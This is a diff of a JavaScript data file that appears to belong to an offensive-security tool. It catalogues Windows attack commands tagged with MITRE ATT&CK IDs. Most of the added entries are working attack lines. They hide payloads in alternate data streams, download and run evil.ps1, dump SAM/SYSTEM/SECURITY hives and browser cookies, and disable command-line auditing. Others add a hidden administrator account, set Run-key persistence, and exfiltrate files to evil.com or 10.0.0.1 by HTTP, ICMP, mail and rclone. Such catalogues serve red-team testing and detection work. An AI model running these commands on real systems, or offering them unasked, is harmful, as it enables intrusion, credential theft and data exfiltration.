@@ -13,11 +13,30 @@
  *                  URL: String,
  *              }?,
  *              LOLBAS: String?,
+ *              Description: String?,
  *          }
  *      }
  * }
  */
 const PAYLOADS = {
+    'Alternate Data Streams': {
+        'Cmd': {
+            'cmd': 'cmd /c echo regsvr32.exe /s /u /i:http://10.0.0.1/evil.exe scrobj.dll > file.docx:payload.bat',
+            'cli': 'Command Prompt',
+            'adminRequired': false,
+            'mitre': {'id': 'T1564.004', 'url': 'https://attack.mitre.org/techniques/T1564/004/'},
+            'lolbas': 'https://lolbas-project.github.io/lolbas/Binaries/Cmd/',
+            'desc': 'The command writes the code "regsvr32.exe /s /u /i:http://10.0.0.1/evil.exe scrobj.dll" to the "payload.bat" and embed it into the "file.docx". The "file.docx" must already exist in the system.',
+        },
+        'Echo (GetObject)': {
+            'cmd': 'echo GetObject("script:https://raw.githubusercontent.com/sailay1996/misc-bin/master/calc.js") > C:\\file.txt:calc.js ',
+            'cli': 'Command Prompt',
+            'adminRequired': false,
+            'mitre': {'id': 'T1564.004', 'url': 'https://attack.mitre.org/techniques/T1564/004/'},
+            'lolbas': null,
+            'desc': 'The command downloads and embeds a JavaScript file to arbitrary file (e.g. \'file.txt\'). The file.txt must already exist on the system.',
+        },
+    },
     'Archive': {
         'PowerShell (Compress-Archive)': {
             'cmd': 'Compress-Archive -Path data.txt -DestinationPath data.zip -Force',
@@ -44,6 +63,14 @@ const PAYLOADS = {
             'mitre': {'id': 'T1105', 'url': 'https://attack.mitre.org/techniques/T1105/'},
             'lolbas': 'https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/',
             'desc': 'If you run it on Command Prompt, replace \';\' with \'&\'.',
+        },
+        'Esentutl': {
+            'cmd': 'esentutl /y .\\file.txt /d .\\file_copied.txt /o',
+            'cli': null,
+            'adminRequired': false,
+            'mitre': {'id': 'T1105', 'url': 'https://attack.mitre.org/techniques/T1105/'},
+            'lolbas': 'https://lolbas-project.github.io/lolbas/Binaries/Esentutl/',
+            'desc': null,
         },
         'Wmic': {
             'cmd': 'wmic datafile where "Name=\'C:\\Windows\\System32\\calc.exe\'" call Copy "C:\\calc.exe"',
@@ -115,6 +142,14 @@ const PAYLOADS = {
             'lolbas': null,
             'desc': 'The command avoids storing PowerShell command history anywhere.',
         },
+        'Reg': {
+            'cmd': 'reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\Audit /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 0 /f',
+            'cli': 'PowerShell',
+            'adminRequired': true,
+            'mitre': {'id': 'T1562.003', 'url': 'https://attack.mitre.org/techniques/T1562/003/'},
+            'lolbas': null,
+            'desc': 'The command disables command line auditing. To enable it, set 1 to the value.',
+        },
     },
     'Disable Event Logging': {
         'PowerShell (Stop-Service)': {
@@ -169,7 +204,7 @@ const PAYLOADS = {
         },
     },
     'Download & Execute': {
-        'PowerShell': {
+        'PowerShell (IEX)': {
             'cmd': 'IEX((New-Object Net.WebClient).DownloadString("https://10.0.0.1/evil.ps1"))',
             'cli': 'PowerShell',
             'adminRequired': false,
@@ -179,6 +214,14 @@ const PAYLOADS = {
         },
     },
     'Dump Credentials': {
+        'Esentutl': {
+            'cmd': 'esentutl /y /vss C:\\Windows\\System32\\config\\SECURITY /d .\\security.bak;esentutl /y /vss C:\\Windows\\System32\\config\\SYSTEM /d .\\system.bak;esentutl /y /vss C:\\Windows\\System32\\config\\SAM /d .\\sam.bak',
+            'cli': null,
+            'adminRequired': true,
+            'mitre': {'id': 'T1003.002', 'url': 'https://attack.mitre.org/techniques/T1003/002/'},
+            'lolbas': null,
+            'desc': 'The command copies the registry hives to each file using Volume Shadow Copies (vss).',
+        },
         'PowerShell (WinPwn)': {
             'cmd': 'IEW(New-Object Net.Webclient).DownloadString(\'https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/WinPwn.ps1\');Kittielocal -noninteractive -browsercredentials',
             'cli': 'PowerShell',
@@ -217,7 +260,7 @@ const PAYLOADS = {
             'cmd': 'fsutil fsinfo drives',
             'cli': null,
             'adminRequired': false,
-            'mitre': {'id': '', 'url': ''},
+            'mitre': {'id': 'T1016', 'url': 'https://attack.mitre.org/techniques/T1016/'},
             'lolbas': null,
             'desc': 'The command enumerates all drives on the target system.',
         },
@@ -245,13 +288,13 @@ const PAYLOADS = {
             'lolbas': null,
             'desc': 'The command enumerates NetBIOS names and IP addresses.',
         },
-        'Net (user)': {
-            'cmd': 'net user',
+        'Net (config)': {
+            'cmd': 'net config workstation',
             'cli': null,
             'adminRequired': false,
-            'mitre': {'id': 'T1087.001', 'url': 'https://attack.mitre.org/techniques/T1087/001/'},
+            'mitre': {'id': '', 'url': ''},
             'lolbas': null,
-            'desc': 'The commnad enumerates local user accounts.',
+            'desc': 'The command enumerates network configuration information.',
         },
         'Net (localgroup)': {
             'cmd': 'net localgroup',
@@ -261,13 +304,28 @@ const PAYLOADS = {
             'lolbas': null,
             'desc': 'The command enumerates local groups.',
         },
-        'Net (config)': {
-            'cmd': 'net config workstation',
+        'Net (user)': {
+            'cmd': 'net user',
             'cli': null,
             'adminRequired': false,
-            'mitre': {'id': '', 'url': ''},
+            'mitre': {'id': 'T1087.001', 'url': 'https://attack.mitre.org/techniques/T1087/001/'},
             'lolbas': null,
-            'desc': 'The command enumerates network configuration information.',
+            'desc': 'The commnad enumerates local user accounts.',
+        },
+        'Net (view)': {
+            'cmd': 'new view \\\\RemoteComputer',
+            'cli': null,
+            'adminRequired': false,
+            'mitre': {'id': 'T1135', 'url': 'https://attack.mitre.org/techniques/T1135/'},
+            'lolbas': null,
+            'desc': 'The command enumerates network shared directories on the specified network. Replace the \'RemoteComputer\' with the remote system such as a computer name or an IP address.',
+        },
+        'Net (share)': {
+            'cmd': 'net share',
+            'cli': null,
+            'adminRequired': false,
+            'lolbas': null,
+            'desc': 'The command enumerates shared drives on the local system.'
         },
         'Netsh': {
             'cmd': 'netsh interface show interface',
@@ -276,6 +334,14 @@ const PAYLOADS = {
             'mitre': {'id': 'T1016', 'url': 'https://attack.mitre.org/techniques/T1016/'},
             'lolbas': null,
             'desc': 'The command enumerates network interface information and status.',
+        },
+        'PowerShell (Get-CimInstance)': {
+            'cmd': 'Get-CimInstance -Query "SELECT * FROM Win32_PnPEntity WHERE (PNPClass = \'Image\' OR PNPClass = \'Camera\')"',
+            'cli': 'PowerShell',
+            'adminRequired': false,
+            'mitre': {'id': 'T1082', 'url': 'https://attack.mitre.org/techniques/T1082/'},
+            'lolbas': null,
+            'desc': 'The command enumerates information of PlugNPlay camera.',
         },
         'PowerShell (Get-ComputerInfo)': {
             'cmd': 'Get-ComputerInfo',
@@ -324,6 +390,22 @@ const PAYLOADS = {
             'mitre': {'id': 'T1057', 'url': 'https://attack.mitre.org/techniques/T1057/'},
             'lolbas': null,
             'desc': 'The command enumerates running processes.'
+        },
+        'PowerShell (Get-SmbShare)': {
+            'cmd': 'Get-SmbShare',
+            'cli': 'PowerShell',
+            'adminRequired': false,
+            'mitre': {'id': 'T1135', 'url': 'https://attack.mitre.org/techniques/T1135/'},
+            'lolbas': null,
+            'desc': 'The command enumerates network shared directories.',
+        },
+        'PowerShell (Reg)': {
+            'cmd': 'reg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\Nls\\Language',
+            'cli': 'PowerShell',
+            'adminRequired': false,
+            'mitre': {'id': 'T1082', 'url': 'https://attack.mitre.org/techniques/T1082/'},
+            'lolbas': null,
+            'desc': 'The command displays the system language.',
         },
         'Route': {
             'cmd': 'route print',
@@ -457,6 +539,40 @@ const PAYLOADS = {
             'desc': null,
         },
     },
+    'Execute ADS': {
+        'Cmd': {
+            'cmd': 'cmd /c start "" "file.docx:payload.bat"',
+            'cli': 'Command Prompt',
+            'adminRequired': false,
+            'mitre': {'id': 'T1564.004', 'url': 'https://attack.mitre.org/techniques/T1564/004/'},
+            'lolbas': 'https://lolbas-project.github.io/lolbas/Binaries/Cmd/',
+            'desc': null,
+        },
+        'Mshta': {
+            'cmd': 'mshta "C:\\file.txt:evil.hta"',
+            'cli': 'Command Prompt',
+            'adminRequired': false,
+            'mitre': {'id': 'T1218.005', 'url': 'https://attack.mitre.org/techniques/T1218/005/'},
+            'lolbas': 'https://lolbas-project.github.io/lolbas/Binaries/Mshta/',
+            'desc': 'The command executes arbitrary JavaScript code in the .hta file embedded in the "file.txt". The .hta file must consist of HTML source code.',
+        },
+        'Wmic': {
+            'cmd': 'wmic process call create "C:\\file.txt:evil.exe"',
+            'cli': 'Command Prompt',
+            'adminRequired': false,
+            'mitre': {'id': 'T1564.004', 'url': 'https://attack.mitre.org/techniques/T1564/004/'},
+            'lolbas': 'https://lolbas-project.github.io/lolbas/Binaries/Wmic/',
+            'desc': null,
+        },
+        'Wscript': {
+            'cmd': 'wscript C:\\file.txt:evil.js',
+            'cli': 'Command Prompt',
+            'adminRequired': false,
+            'mitre': {'id': 'T1564.004', 'url': 'https://attack.mitre.org/techniques/T1564/004/'},
+            'lolbas': 'https://lolbas-project.github.io/lolbas/Binaries/Wscript/',
+            'desc': 'The command executes arbitrary Javascript code embedded in another file.',
+        },
+    },
     'Execute DLL': {
         'Rundll32': {
             'cmd': 'rundll32 evil.dll,EntryPoint',
@@ -549,41 +665,75 @@ const PAYLOADS = {
             'desc': null,
         },
     },
-    'Execute Hidden Files': {
-        'Cmd': {
-            'cmd': 'cmd /c start "" "file.docx:payload.bat"',
-            'cli': 'Command Prompt',
+    'Exfiltrate': {
+        'PowerShell (Invoke-WebRequest)': {
+            'cmd': '$content = Get-Content .\\data.txt;iwr -uri http://10.0.0.1 -Method POST -Body $content',
+            'cli': 'PowerShell',
             'adminRequired': false,
-            'mitre': {'id': 'T1564.004', 'url': 'https://attack.mitre.org/techniques/T1564/004/'},
-            'lolbas': 'https://lolbas-project.github.io/lolbas/Binaries/Cmd/',
-            'desc': null,
+            'mitre': {'id': 'T1048.003', 'url': 'https://attack.mitre.org/techniques/T1048/003/'},
+            'lolbas': null,
+            'desc': 'The command sends data to the attacker\'s HTTP server.',
         },
-        'Mshta': {
-            'cmd': 'mshta "C:\\file.txt:evil.hta"',
+        'PowerShell (Ping)': {
+            'cmd': '$ping = New-Object System.Net.Networkinformation.ping; foreach($Data in Get-Content -Path C:\\data.txt -Encoding Byte -ReadCount 1024) {$ping.Send("evil.com", 1500, $Data)}',
+            'cli': 'PowerShell',
+            'adminRequired': false,
+            'mitre': {'id': 'T1048.003', 'url': 'https://attack.mitre.org/techniques/T1048/003/'},
+            'lolbas': null,
+            'desc': 'The command sends ICMP packets with arbitrary file data to the attack server.'
+        },
+        'PowerShell (Send-MailMessage)': {
+            'cmd': 'Send-MailMessage -From sender@evil.com -To recipient@evil.com -Subject "Hello" -Attachments C:\\data.txt -SmtpServer 10.0.0.1',
+            'cli': 'PowerShell',
+            'adminRequired': false,
+            'mitre': {'id': 'T1048.003', 'url': 'https://attack.mitre.org/techniques/T1048/003/'},
+            'lolbas': null,
+            'desc': 'The command sends a mail attached a file to the attack server.',
+        },
+        'Rclone': {
+            'cmd': 'rclone config create ftpserver "ftp" "host" "ftp.dlptest.com" "port" "21" "user" "dlpuser" "pass" "rNrKYTX9g7z3RgJRmxWuGHbeu";rclone.exe copy --max-age 2y C:\\data.zip ftpserver --bwlimit 2M -q --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers 12 -P --ftp-no-check-certificate',
             'cli': null,
             'adminRequired': false,
-            'mitre': {'id': 'T1218.005', 'url': 'https://attack.mitre.org/techniques/T1218/005/'},
-            'lolbas': 'https://lolbas-project.github.io/lolbas/Binaries/Mshta/',
-            'desc': 'The command executes arbitrary JavaScript code in the .hta file embedded in the "file.txt". The .hta file must consist of HTML source code.',
-        },
-        'Wmic': {
-            'cmd': 'wmic process call create "C:\\file.txt:evil.exe"',
-            'cli': null,
-            'adminRequired': false,
-            'mitre': {'id': 'T1564.004', 'url': 'https://attack.mitre.org/techniques/T1564/004/'},
-            'lolbas': 'https://lolbas-project.github.io/lolbas/Binaries/Wmic/',
-            'desc': null,
+            'mitre': {'id': 'T1048.003', 'url': 'https://attack.mitre.org/techniques/T1048/003/'},
+            'lolbas': null,
+            'desc': 'The command sends a data file (\'data.zip\') to the FTP server (\'ftp.dlptest.com\'). rclone.exe is not a built-in binary, so it must exist on the target system.',
         },
     },
-    'Hide Files': {
-        'Cmd': {
-            'cmd': 'cmd /c echo regsvr32.exe /s /u /i:http://10.0.0.1/evil.exe scrobj.dll > file.docx:payload.bat',
-            'cli': 'Command Prompt',
+    'Manipulate Accounts': {
+        'Net': {
+            'cmd': 'net user evil /add;net user evil \'Password123\';net localgroup Administrators evil /add',
+            'cli': null,
+            'adminRequired': true,
+            'mitre': {'id': 'T1136.001', 'url': 'https://attack.mitre.org/techniques/T1136/001/'},
+            'lolbas': null,
+            'desc': 'The command creates a new local user and add it to the Administrator group. To delete the account, execute \'net localgroup Administrators evil /delete;net user evil /delete\'.',
+        },
+    },
+    'Modify Permissions': {
+        'Attrib': {
+            'cmd': 'attrib +h .\\file.txt',
+            'cli': null,
             'adminRequired': false,
-            'mitre': {'id': 'T1564.004', 'url': 'https://attack.mitre.org/techniques/T1564/004/'},
-            'lolbas': 'https://lolbas-project.github.io/lolbas/Binaries/Cmd/',
-            'desc': 'The command writes the code "regsvr32.exe /s /u /i:http://10.0.0.1/evil.exe scrobj.dll" to the "payload.bat" and embed it into the "file.docx". The "file.docx" must already exist in the system.',
-        }
+            'mitre': {'id': 'T1222.001', 'url': 'https://attack.mitre.org/techniques/T1222/001/'},
+            'lolbas': null,
+            'desc': 'The command hides a file so innocent users cannot see the file. However, the \'-Hidden\' or \'-Force\' options of the \'dir\' command can display hidden files.'
+        },
+        'Icacls': {
+            'cmd': 'icacls .\\file_or_dir /grant Everyone:F',
+            'cli': null,
+            'adminRequired': false,
+            'mitre': {'id': 'T1222.001', 'url': 'https://attack.mitre.org/techniques/T1222/001/'},
+            'lolbas': null,
+            'desc': 'The command grands permission of the file/directory to all users.',
+        },
+        'Takeown': {
+            'cmd': 'takeown /f .\\file_or_dir /r',
+            'cli': null,
+            'adminRequired': false,
+            'mitre': {'id': 'T1222.001', 'url': 'https://attack.mitre.org/techniques/T1222/001/'},
+            'lolbas': null,
+            'desc': 'The command resets a file/directory permission to allow the current user to own.',
+        },
     },
     'Persistence': {
         'Netsh': {
@@ -594,7 +744,7 @@ const PAYLOADS = {
             'lolbas': 'https://lolbas-project.github.io/lolbas/Binaries/Netsh/',
             'desc': 'The DLL file must contain the "InitHelperDll" function marked with \'__declspec(dllexport)\'. Once added, the "InitHelperDll" function will be executed each time the netsh command is run.'
         },
-        'Reg (Unprivileged)': {
+        'Reg (Run, Unprivileged)': {
             'cmd': 'reg add HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v MyTest /t REG_SZ /d "C:\\evil.exe" /f',
             'cli': null,
             'adminRequired': false,
@@ -602,7 +752,7 @@ const PAYLOADS = {
             'lolbas': null,
             'desc': 'The commnad will cause arbitrary executable file or command to run when the current user logs on.',
         },
-        'Reg (Privileged)': {
+        'Reg (Run, Privileged)': {
             'cmd': 'reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v MyTest /t REG_SZ /d "C:\\evil.exe" /f',
             'cli': null,
             'adminRequired': true,
@@ -617,6 +767,44 @@ const PAYLOADS = {
             'mitre': {'id': 'T1053.005', 'url': 'https://attack.mitre.org/techniques/T1053/005/'},
             'lolbas': 'https://lolbas-project.github.io/lolbas/Binaries/Schtasks/',
             'desc': null,
+        },
+    },
+    'Reveal ADS': {
+        'Dir': {
+            'cmd': 'dir /r .\\file.txt',
+            'cli': 'Command Prompt',
+            'adminRequired': false,
+            'mitre': {'id': 'T1564.004', 'url': 'https://attack.mitre.org/techniques/T1564/004/'},
+            'lolbas': null,
+            'desc': 'The command reveals an information of Alternate Data Stream in arbitrary file (\'file.txt\').',
+        },
+    },
+    'Sniff Network': {
+        'Pktmon': {
+            'cmd': 'pktmon start --etw -f .\\trace.etl;timeout /t 5;pktmon stop;pktmon etl2pcap .\\trace.etl -o .\\trace.pcapng',
+            'cli': null,
+            'adminRequired': true,
+            'mitre': {'id': 'T1040', 'url': 'https://attack.mitre.org/techniques/T1040/'},
+            'lolbas': null,
+            'desc': 'The commands capture packets in 5 seconds, then save and convert the saved file to the .pcapng file for analyzing with WireShark.',
+        },
+        'PowerShell': {
+            'cmd': '$CaptureFile = "C:\\trace.etl";$PcapFile = "C:\\trace.pcapng";New-NetEventSession -Name EvilSniff -LocalFilePath $CaptureFile;Add-NetEventPacketCaptureProvider -SessionName EvilSniff -TruncationLength 100;Start-NetEventSession -Name EvilSniff;timeout /t 5;Stop-NetEventSession -Name EvilSniff;Remove-NetEventSession -Name EvilSniff;pktmon etl2pcap $CaptureFile -o $PcapFile',
+            'cli': 'PowerShell',
+            'adminRequired': true,
+            'mitre': {'id': 'T1040', 'url': 'https://attack.mitre.org/techniques/T1040/'},
+            'lolbas': null,
+            'desc': 'The commands capture packets in 5 seconds, then save and convert the saved file to the .pcapng file for analyzing with WireShark.',
+        },
+    },
+    'Steal Cookies': {
+        'PowerShell': {
+            'cmd': 'cp "$env:APPDATA\\Mozilla\\FireFox\\Profiles\\*\\cookies.sqlite" .\\cookies_firefox.sqlite;cp "$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Network\\Cookies" .\\cookies_chrome.sqlite;cp "$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies" .\\cookies_edge.sqlite',
+            'cli': 'PowerShell',
+            'adminRequired': false,
+            'mitre': {'id': 'T1539', 'url': 'https://attack.mitre.org/techniques/T1539/'},
+            'lolbas': null,
+            'desc': 'The commands copies FireFox, Chrome and Microsoft Edge cookies to current directory. These files can be read using \'sqlite3\' or other dumping tools.',
         },
     },
     'UAC Bypass': {
